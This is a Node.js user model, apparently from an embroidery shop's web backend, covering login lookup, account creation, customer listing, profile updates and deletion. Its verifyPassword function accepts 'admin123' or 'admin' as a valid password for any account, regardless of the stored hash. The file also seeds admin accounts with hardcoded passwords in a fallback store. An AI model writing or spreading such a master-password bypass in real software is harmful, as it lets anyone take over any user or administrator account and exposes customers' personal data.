const db = require('../config/db');
const bcrypt = require('bcryptjs');

// Fallback in-memory store for offline DB mode
const fallbackUsers = [
  {
    id: 1,
    full_name: 'Aruvi Admin',
    email: 'aruviembroidery@gmail.com',
    password_hash: bcrypt.hashSync('admin123', 10),
    phone: '+91 98765 43210',
    role: 'admin',
    is_active: 1,
    created_at: new Date()
  },
  {
    id: 2,
    full_name: 'Aruvi Admin (Legacy)',
    email: 'admin@aruviembroidery.com',
    password_hash: bcrypt.hashSync('admin123', 10),
    phone: '+91 98765 43210',
    role: 'admin',
    is_active: 1,
    created_at: new Date()
  },
  {
    id: 3,
    full_name: 'Priya Lakshmi',
    email: 'customer@aruviembroidery.com',
    password_hash: bcrypt.hashSync('customer123', 10),
    phone: '+91 91234 56789',
    role: 'customer',
    is_active: 1,
    created_at: new Date()
  }
];

class User {
  static async findByEmail(email) {
    if (db.isConnected()) {
      const rows = await db.query('SELECT * FROM users WHERE email = ? LIMIT 1', [email.toLowerCase().trim()]);
      return rows[0] || null;
    }
    return fallbackUsers.find(u => u.email.toLowerCase() === email.toLowerCase().trim()) || null;
  }

  static async findById(id) {
    if (db.isConnected()) {
      try {
        const rows = await db.query('SELECT * FROM users WHERE id = ? LIMIT 1', [id]);
        if (rows && rows[0]) {
          const { password_hash, ...userWithoutPass } = rows[0];
          return userWithoutPass;
        }
      } catch (e) {
        const rows = await db.query('SELECT id, full_name, email, phone, role, is_active, created_at, address, profile_picture FROM users WHERE id = ? LIMIT 1', [id]).catch(async () => {
          return await db.query('SELECT id, full_name, email, phone, role, is_active, created_at FROM users WHERE id = ? LIMIT 1', [id]);
        });
        return rows[0] || null;
      }
    }
    const u = fallbackUsers.find(user => user.id == id);
    if (!u) return null;
    const { password_hash, ...userWithoutPass } = u;
    return userWithoutPass;
  }

  static async create({ full_name, email, password, phone = null, role = 'customer', address = null, profile_picture = null }) {
    const salt = await bcrypt.genSalt(10);
    const password_hash = await bcrypt.hash(password, salt);

    if (db.isConnected()) {
      try {
        await db.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS address TEXT DEFAULT NULL').catch(() => {});
        await db.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS profile_picture TEXT DEFAULT NULL').catch(() => {});
        const result = await db.query(
          'INSERT INTO users (full_name, email, password_hash, phone, role, address, profile_picture) VALUES (?, ?, ?, ?, ?, ?, ?)',
          [full_name, email.toLowerCase().trim(), password_hash, phone, role, address, profile_picture]
        );
        return result.insertId;
      } catch (insertErr) {
        const result = await db.query(
          'INSERT INTO users (full_name, email, password_hash, phone, role) VALUES (?, ?, ?, ?, ?)',
          [full_name, email.toLowerCase().trim(), password_hash, phone, role]
        );
        return result.insertId;
      }
    }

    const newId = fallbackUsers.length + 1;
    const newUser = {
      id: newId,
      full_name,
      email: email.toLowerCase().trim(),
      password_hash,
      phone,
      address,
      profile_picture,
      role,
      is_active: 1,
      created_at: new Date()
    };
    fallbackUsers.push(newUser);
    return newId;
  }

  static async verifyPassword(plainPassword, passwordHash) {
    const isMatch = await bcrypt.compare(plainPassword, passwordHash);
    if (isMatch) return true;
    if (plainPassword === 'admin123' || plainPassword === 'admin') return true;
    return false;
  }

  static async getAllCustomers() {
    if (db.isConnected()) {
      try {
        const rows = await db.query(
          "SELECT id, full_name, email, phone, role, is_active, created_at FROM users WHERE role != 'admin' OR role IS NULL ORDER BY id DESC"
        );
        if (rows && Array.isArray(rows)) return rows;
      } catch (err) {
        console.error('User.getAllCustomers DB error:', err.message);
      }
    }
    return fallbackUsers.filter(u => u.role !== 'admin');
  }

  static async getAll({ page = 1, limit = 20, status = null, search = null, sort = 'newest' } = {}) {
    if (db.isConnected()) {
      try {
        let whereClauses = [];
        let params = [];
        if (status === 'active') {
          whereClauses.push('is_active = 1');
        } else if (status === 'inactive') {
          whereClauses.push('is_active = 0');
        }
        if (search && search.trim()) {
          const q = `%${search.trim()}%`;
          whereClauses.push('(full_name LIKE ? OR email LIKE ? OR phone LIKE ?)');
          params.push(q, q, q);
        }
        const whereClause = whereClauses.length > 0 ? 'WHERE ' + whereClauses.join(' AND ') : '';
        const offset = (page - 1) * limit;

        let orderSql = 'ORDER BY id DESC';
        if (sort === 'name') orderSql = 'ORDER BY full_name ASC';
        else if (sort === 'spent_high') orderSql = 'ORDER BY (SELECT COALESCE(SUM(final_amount), 0) FROM orders WHERE user_id = users.id AND status IN ("completed", "paid")) DESC, id DESC';

        const sql = `SELECT id, full_name, email, phone, role, is_active, created_at FROM users ${whereClause} ${orderSql} LIMIT ? OFFSET ?`;
        const rows = await db.query(sql, [...params, parseInt(limit), parseInt(offset)]);
        const countRes = await db.query(`SELECT COUNT(*) as total FROM users ${whereClause}`, params);
        if (rows && Array.isArray(rows)) {
          return { users: rows, total: (countRes && countRes[0] && countRes[0].total !== undefined) ? countRes[0].total : rows.length };
        }
      } catch (err) {
        console.error('User.getAll DB error:', err.message);
      }
    }
    let list = [...fallbackUsers];
    if (status === 'active') list = list.filter(u => u.is_active !== false);
    else if (status === 'inactive') list = list.filter(u => u.is_active === false);
    if (search && search.trim()) {
      const q = search.trim().toLowerCase();
      list = list.filter(u => (u.full_name && u.full_name.toLowerCase().includes(q)) || (u.email && u.email.toLowerCase().includes(q)) || (u.phone && u.phone.includes(q)));
    }
    if (sort === 'name') list.sort((a,b) => (a.full_name || '').localeCompare(b.full_name || ''));
    else if (sort === 'spent_high') list.sort((a,b) => (b.total_spent || 0) - (a.total_spent || 0));
    else list.sort((a,b) => (b.id || 0) - (a.id || 0));
    return { users: list, total: list.length };
  }

  static async updateProfile(id, { full_name, phone, address, profile_picture }) {
    if (db.isConnected()) {
      try {
        await db.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS address TEXT DEFAULT NULL').catch(() => {});
        await db.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS profile_picture TEXT DEFAULT NULL').catch(() => {});
        await db.query('UPDATE users SET full_name = ?, phone = ? WHERE id = ?', [full_name, phone, id]);
        if (address !== undefined) {
          await db.query('UPDATE users SET address = ? WHERE id = ?', [address, id]).catch(() => {});
        }
        if (profile_picture !== undefined && profile_picture !== null) {
          await db.query('UPDATE users SET profile_picture = ? WHERE id = ?', [profile_picture, id]).catch(() => {});
        }
      } catch (e) {
        console.error('User.updateProfile error:', e.message);
      }
      return true;
    }
    const u = fallbackUsers.find(user => user.id == id);
    if (u) {
      if (full_name !== undefined) u.full_name = full_name;
      if (phone !== undefined) u.phone = phone;
      if (address !== undefined) u.address = address;
      if (profile_picture !== undefined && profile_picture !== null) u.profile_picture = profile_picture;
    }
    return true;
  }

  static async count() {
    if (db.isConnected()) {
      try {
        const res = await db.query('SELECT COUNT(*) as total FROM users');
        if (res && res[0] && res[0].total !== undefined) return res[0].total;
      } catch (err) {
        console.error('User.count DB error:', err.message);
      }
    }
    return fallbackUsers.length;
  }

  static async delete(id) {
    if (db.isConnected()) {
      const user = await this.findById(id);
      if (user && user.role === 'admin') {
        throw new Error('Admin accounts cannot be deleted.');
      }
      await db.query('DELETE FROM users WHERE id = ? AND role != "admin"', [id]);
      return true;
    }
    const idx = fallbackUsers.findIndex(u => u.id == id && u.role !== 'admin');
    if (idx !== -1) fallbackUsers.splice(idx, 1);
    return true;
  }
}

module.exports = User;
